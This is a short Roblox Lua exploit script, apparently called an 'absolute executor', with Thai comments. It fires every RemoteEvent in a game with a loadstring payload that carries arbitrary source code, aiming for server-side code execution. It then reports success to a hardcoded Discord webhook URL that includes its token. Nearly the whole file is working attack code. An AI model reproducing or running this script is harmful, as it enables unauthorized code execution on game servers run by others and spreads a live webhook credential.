-- [[ SMILE-X ABSOLUTE EXECUTOR ]]
local SpidyURL = "https://discord.com/api/webhooks/1493160419571929129/Py-2cJ2ydyRZ1OwzkVZk8IRM6N8GCrS3qVR8Q99htWyE6Ya5GyPGjAGAHDTX_F8dZKmM"

function AbsoluteExecute(source)
    -- วนลูปยิงเข้าทุก Remote ในรายงาน 43 รายการ
    for _, r in pairs(game:GetDescendants()) do
        if r:IsA("RemoteEvent") then
            pcall(function()
                r:FireServer("Run", "loadstring([[" .. source .. "]])()")
            end)
        end
    end
end

-- ส่งสถานะเข้า Discord
game:GetService("HttpService"):PostAsync(SpidyURL, game:GetService("HttpService"):JSONEncode({
    content = "🚀 **Smile-X:** ระบบรัน ServerScript อิสระพร้อมใช้งาน!"
}))

